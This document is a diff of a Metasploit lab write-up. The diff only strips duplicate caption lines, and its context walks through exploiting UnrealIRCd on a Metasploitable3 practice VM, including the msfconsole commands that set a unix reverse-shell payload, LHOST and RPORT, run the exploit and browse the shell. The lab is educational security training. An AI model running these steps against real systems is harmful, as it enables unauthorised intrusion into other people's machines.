@@ -25,7 +25,6 @@ We’re looking for interesting open ports and services that we might want to ta
 /// caption
 Port Scanning Results
 ///
-Port Scanning Results
 
 UnrealIRCd[[1]](https://www.notion.so/Lab-5-Metasploit-b091b960bf1648859b04467945712a22?pvs=21) is an open-source Internet Relay Chat (IRC) server software that allows users to host and run their own IRC networks. IRC is a communication protocol used for real-time text messaging and file sharing on the internet. UnrealIRCd is one of the most popular IRC server software packages available and is used by many large IRC networks and smaller communities alike.
 
@@ -49,7 +48,6 @@ It is important to note that the Exploit Database should be used responsibly and
 /// caption
 Searching for Unrealircd
 ///
-Searching for Unrealircd
 
 Looks like there’s an exploit available for use with Metasploit!
 
@@ -73,7 +71,6 @@ The `search` command in `msfconsole` is used to search for specific exploits, pa
 /// caption
 Metasploit Search Results
 ///
-Metasploit Search Results
 
 There’s the exploit we saw from `searchsploit`!
 
@@ -91,7 +88,6 @@ In the image below you can see the rank is “Excellent” and the exploit takes
 /// caption
 Module Info
 ///
-Module Info
 
 Let’s go ahead and use the module by running the below command.
 
@@ -103,7 +99,6 @@ use 0
 /// caption
 Use Command
 ///
-Use Command
 
 Let’s see how to configure the module with the below command…
 
@@ -115,7 +110,6 @@ options
 /// caption
 Module Ooptions
 ///
-Module Ooptions
 
 We’re missing our target IP specification. Let’s set that now with the below command.
 
@@ -129,7 +123,6 @@ set RHOSTS [Metasploitable3_IP_Address]
 /// caption
 Remote Hosts Targeting
 ///
-Remote Hosts Targeting
 
 We’re ready to try exploiting! Run the below command…
 
@@ -141,7 +134,6 @@ exploit
 /// caption
 Exploit! Errr…maybe not
 ///
-Exploit! Errr…maybe not
 
 Uh oh! Looks like it failed cause we didn’t select a payload to use with our exploit.
 
@@ -159,7 +151,6 @@ show payloads
 /// caption
 Available Payloads
 ///
-Available Payloads
 
 Let’s keep things simple and choose `payload/cmd/unix/reverse` payload. We can select it via its index number with the below command…
 
@@ -171,7 +162,6 @@ set PAYLOAD payload/cmd/unix/reverse
 /// caption
 Payload Selection
 ///
-Payload Selection
 
 Now double check the configuration options with the below command since we now have a payload selected.
 
@@ -183,7 +173,6 @@ options
 /// caption
 Module Options
 ///
-Module Options
 
 Looks like we need to set the `LHOST` option for the payload.
 
@@ -197,7 +186,6 @@ set LHOST ens33
 /// caption
 Set LHOST
 ///
-Set LHOST
 
 Triple check the configuration…
 
@@ -209,7 +197,6 @@ options
 /// caption
 Module Options
 ///
-Module Options
 
 Things look good! Let’s run the exploit again with the below command.
 
@@ -221,7 +208,6 @@ exploit
 /// caption
 Failed?!
 ///
-Failed?!
 
 Take a closer look at the `options` from the above screenshot. Notice we had the target set to the default port `6667` but the nmap scan said IRC was actually running on on port `6697`. Well that’s an easy fix. Let’s just update the `RPORT` option.
 
@@ -233,7 +219,6 @@ set RPORT 6697
 /// caption
 Corrected target RPORT
 ///
-Corrected target RPORT
 
 It’s important to remember that modules have default values but you should always make sure that you are customizing them to your target. 
 
@@ -247,7 +232,6 @@ exploit
 /// caption
 Exploit! (for real this time)
 ///
-Exploit! (for real this time)
 
 SUCCESS! [evil laugh]
 
@@ -259,7 +243,6 @@ Start exploring the target/victim machine with the below commands like `whoami`,
 /// caption
 On The Target Machine
 ///
-On The Target Machine
 
 You can end the shell session by pressing `Control+C` keys.
 
@@ -271,7 +254,6 @@ CTRL+C
 /// caption
 Exiting The Shell
 ///
-Exiting The Shell
 
 And exit Metasploit to end the Lab.
 
@@ -283,6 +265,3 @@ exit
 /// caption
 Exiting Metasploit
 ///
-Exiting Metasploit
-
-[[1]](https://www.notion.so/Lab-5-Metasploit-b091b960bf1648859b04467945712a22?pvs=21) https://www.unrealircd.org/
